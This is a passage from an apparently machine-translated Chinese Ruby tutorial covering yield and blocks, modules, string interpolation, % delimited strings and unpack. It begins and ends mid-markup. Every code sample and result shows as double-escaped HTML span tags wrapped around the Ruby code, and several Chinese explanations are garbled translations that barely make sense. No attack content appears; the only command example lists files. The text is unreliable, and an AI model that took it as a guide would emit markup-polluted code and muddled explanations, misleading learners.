class=&quot;str&quot;&gt;&quot;C&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;C++&quot;&lt;/span&gt;</code></li><li><p><code>&lt;span class=&quot;pln&quot;&gt;test&lt;/span&gt;</code></p></li></pre></div></div><div>这将产生以下结果：&nbsp;</div><div><div><pre class="prettyprint linenums prettyprinted"><p></p><li><p><code>&lt;span class=&quot;typ&quot;&gt;The&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; programming language is C&lt;/span&gt;</code></p></li><li><code>&lt;span class=&quot;typ&quot;&gt;The&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; programming language is C&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;++&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;typ&quot;&gt;The&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; programming language is &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Ruby&lt;/span&gt;</code></li><li><p><code>&lt;span class=&quot;typ&quot;&gt;The&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; programming language is &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Perl&lt;/span&gt;</code></p></li></pre></div><div><div><pre class="prettyprint linenums prettyprinted"><p></p><li><p><code>&lt;span class=&quot;kwd&quot;&gt;return&lt;/span&gt;</code></p></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;OR&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;kwd&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;12&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;OR&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;kwd&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;</code></li></pre></div></div></div></div><h3 id="9-块"><a href="#9-块" class="headerlink" title="9.块"></a>9.块</h3><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pln&quot;&gt;block_name&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; statement1&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; statement2&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;..........&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;</code></pre></div><div><div><strong>yield 语句:</strong></div><div>让我们来看看在yield语句的一个例子：</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pln&quot;&gt;def test&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;You are in the method&quot;&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; yield&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;You are again back to the method&quot;&lt;/span&gt;</code><br>7.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; yield&lt;/span&gt;</code><br>8.  <code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code><br>9.  <code>&lt;span class=&quot;pln&quot;&gt;test &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;You are in the block&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;</code></pre></div></div><div>这将产生以下结果：</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;typ&quot;&gt;You&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; are in the method&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;typ&quot;&gt;You&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; are in the block&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;typ&quot;&gt;You&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; are again back to the method&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;typ&quot;&gt;You&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; are in the block&lt;/span&gt;</code></pre></div></div><div>也可以通过参数与屈服声明。下面是一个例子：</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pln&quot;&gt;def test&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; yield &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;You are in the method test&quot;&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; yield &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;100&lt;/span&gt;</code><br>7.  <code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code><br>8.  <code>&lt;span class=&quot;pln&quot;&gt;test &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;You are in the block #{i}&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;</code></pre></div></div><div>这将产生以下结果：</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;typ&quot;&gt;You&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; are in the block &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;typ&quot;&gt;You&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; are in the method test&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;typ&quot;&gt;You&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; are in the block &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;100&lt;/span&gt;</code></pre></div></div><div>这里的 yield 语句写到后面跟着参数。甚至可以传递多个参数。在该块中放置在两条垂直线之间的变量（| |）接收的参数。</div><div>因此，在上面的代码中，yield5语句将试块作为一个参数值5。</div><div>现在看看下面的语句：</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pln&quot;&gt;test &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;You are in the block #{i}&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;</code></pre></div></div><div>在这里，在变量i中的值为5。现在遵守以下 puts 语句：</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pln&quot;&gt;puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;You are in the block #{i}&quot;&lt;/span&gt;</code></pre></div></div><div>puts 语句的输出是：</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;typ&quot;&gt;You&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; are in the block &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;</code></pre></div></div><div>如果想超过一个参数，然后yield语句就变成了：&nbsp;</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pln&quot;&gt;yield a&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; b&lt;/span&gt;</code></pre></div></div><div>那么块是：</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pln&quot;&gt;test &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; b&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; statement&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;</code></pre></div></div><div>这些参数将用逗号隔开。</div><div><strong>块和方法:</strong></div><div>我们已经看到了如何将一个块和方法关联。通常调用块从块具有相同名称的方法，通过使用yield语句。因此，编写：</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pln&quot;&gt;def test&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp; yield&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;pln&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Hello world&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;</code></pre></div></div><div>这个例子是最简单的方式来实现一个块。调用块 test 使用yield语句。</div><div>但是，如果最后一个参数的方法前面加上＆，那么可以通过一个块这种方法，此块将被分配到最后一个参数。</div><div>&amp;#42和＆在参数列表中＆还在后面。</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pln&quot;&gt;def test&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&amp;amp;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; block&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;call&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;pln&quot;&gt;test &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Hello World!&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;</code><br>7.  <code>&lt;span class=&quot;typ&quot;&gt;This&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; will produce following result&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code><br>8.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>9.  <code>&lt;span class=&quot;typ&quot;&gt;Hello&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;World&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;!&lt;/span&gt;</code></pre></div><h3 id="10-模块"><a href="#10-模块" class="headerlink" title="10.模块"></a>10.模块</h3><p></p></div></div></div><div><div><pre class="prettyprint linenums prettyprinted"><p></p><ol><li><code>&lt;span class=&quot;pln&quot;&gt;module &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Identifier&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; statement1&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; statement2&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;...........&lt;/span&gt;</code></li><li><p><code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></p></li></ol></pre></div><div>例子：</div></div><div><div>考虑以下模块写在support.rb文件。</div><div><div><pre class="prettyprint linenums prettyprinted"><p></p><li><p><code>&lt;span class=&quot;pln&quot;&gt;module &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Week&lt;/span&gt;</code></p></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; FIRST_DAY &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Sunday&quot;&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; def &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Week&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;weeks_in_month&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;You have four weeks in a month&quot;&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; end&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; def &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Week&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;weeks_in_year&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;You have 52 weeks in a year&quot;&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; end&lt;/span&gt;</code></li><li><p><code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></p></li></pre></div></div><div>现在，可以在如下一类包括这个模块：</div><div><div><pre class="prettyprint linenums prettyprinted"><p></p><li><p><code>&lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;</code></p></li><li><code>&lt;span class=&quot;pln&quot;&gt;require &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;support&quot;&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;kwd&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Decade&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;include &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Week&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; no_of_yrs&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;10&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; def no_of_months&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Week&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;FIRST_DAY&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; number&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;#42&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;12&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; puts number&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; end&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;d1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Decade&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;new&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;puts &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Week&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;FIRST_DAY&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;typ&quot;&gt;Week&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;weeks_in_month&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;typ&quot;&gt;Week&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;weeks_in_year&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;d1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;no_of_months&lt;/span&gt;</code></li></pre></div><h3 id="11-字符"><a href="#11-字符" class="headerlink" title="11.字符"></a>11.字符</h3><p></p></div></div><div>字符转义；</div><div>表达式替换：</div><div><div><div><pre class="prettyprint linenums prettyprinted"><p></p><ol><li><code>&lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; y&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; z &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;72&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;The value of x is #{ x }.&quot;&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;The sum of x and y is #{ x + y }.&quot;&lt;/span&gt;</code></li><li><p><code>&lt;span class=&quot;pln&quot;&gt;puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;The average was #{ (x + y + z)/3 }.&quot;&lt;/span&gt;</code></p></li></ol></pre></div></div><div>这将产生以下结果：</div><div><div><pre class="prettyprint linenums prettyprinted"><p></p><li><p><code>&lt;span class=&quot;typ&quot;&gt;The&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; value of x is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;12.&lt;/span&gt;</code></p></li><li><code>&lt;span class=&quot;typ&quot;&gt;The&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; sum of x and y is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;48.&lt;/span&gt;</code></li><li><p><code>&lt;span class=&quot;typ&quot;&gt;The&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; average was &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;40.&lt;/span&gt;</code></p></li></pre></div><div>特殊字符：</div></div></div><div><div>一般分隔的字符串，可以创建字符串匹配任意分隔符，比如，</div><div>虽然包含在一对，如：., !, (, {, &lt;, 等，前面加上一个百分号(%). Q, q 和 x，</div><div>有特殊的含义一般可以分隔的字符串。</div><div><div><pre class="prettyprint linenums prettyprinted"><p></p><li><p><code>&lt;span class=&quot;pun&quot;&gt;%{&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Ruby&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; is fun&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.}&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp; equivalent to &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Ruby is fun.&quot;&lt;/span&gt;</code></p></li><li><code>&lt;span class=&quot;pun&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;Q&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Ruby&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; is fun&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; equivalent to &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot; Ruby is fun. &quot;&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pun&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Ruby&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; is fun&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.]&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp; equivalent to a single&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;quoted string&lt;/span&gt;</code></li><li><p><code>&lt;span class=&quot;pun&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;ls&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; equivalent to back tick command output &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;</code><span class="pln">ls</span><span class="pun"><code>&lt;/span&gt;</code></span></p></li></pre></div><div>字符解压：</div></div></div><div><div>试试下面的例子来解压缩各种数据。&nbsp;</div><div><div><pre class="prettyprint linenums prettyprinted"><p></p><li><p><code>&lt;span class=&quot;str&quot;&gt;&quot;abc \0\0abc \0\0&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;A6Z6&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#=&amp;gt; [&quot;abc&quot;, &quot;abc &quot;]&lt;/span&gt;</code></p></li><li><code>&lt;span class=&quot;str&quot;&gt;&quot;abc \0\0&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;a3a3&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#=&amp;gt; [&quot;abc&quot;, &quot; \000\000&quot;]&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;str&quot;&gt;&quot;abc \0abc \0&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;Z&amp;#42Z&amp;#42&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#=&amp;gt; [&quot;abc &quot;, &quot;abc &quot;]&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;str&quot;&gt;&quot;aa&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;b8B8&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#=&amp;gt; [&quot;10000110&quot;, &quot;01100001&quot;]&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;str&quot;&gt;&quot;aaa&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;h2H2c&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 